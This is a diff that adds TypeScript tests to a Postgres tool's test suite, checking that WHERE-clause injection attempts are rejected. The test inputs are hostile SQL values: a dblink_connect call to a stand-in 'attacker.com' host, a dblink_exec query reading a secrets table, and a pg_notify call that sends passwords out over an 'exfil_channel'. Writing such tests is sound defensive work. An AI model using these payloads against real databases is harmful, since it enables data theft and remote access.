@@ -318,6 +318,68 @@ describe("FTS Config SQL Injection", () => {
 });
 
 // =============================================================================
+// WHERE Clause — Remote Access & Side Channel Injection Tests
+// =============================================================================
+
+describe("WHERE Clause Remote Access & Side Channel Injection", () => {
+  let mockAdapter: ReturnType<typeof createMockPostgresAdapter>;
+  let textTools: ReturnType<typeof getTextTools>;
+  let mockContext: ReturnType<typeof createMockRequestContext>;
+
+  beforeEach(() => {
+    vi.clearAllMocks();
+    mockAdapter = createMockPostgresAdapter();
+    textTools = getTextTools(mockAdapter as unknown as PostgresAdapter);
+    mockContext = createMockRequestContext();
+  });
+
+  it("should reject WHERE clause with dblink_connect", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "1=1 OR dblink_connect('host=attacker.com')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with dblink_exec", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "1=1 OR dblink_exec('conn', 'SELECT * FROM secrets')",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+
+  it("should reject WHERE clause with pg_notify", async () => {
+    const tool = textTools.find((t) => t.name === "pg_trigram_similarity")!;
+    const result = (await tool.handler(
+      {
+        table: "test_products",
+        column: "name",
+        value: "Product",
+        where: "pg_notify('exfil_channel', password)",
+      },
+      mockContext,
+    )) as { success: boolean; error: string };
+    expect(result.success).toBe(false);
+    expect(result.error).toContain("Unsafe WHERE clause");
+  });
+});
+
+// =============================================================================
 // Vector Tools WHERE Injection Tests
 // =============================================================================
 
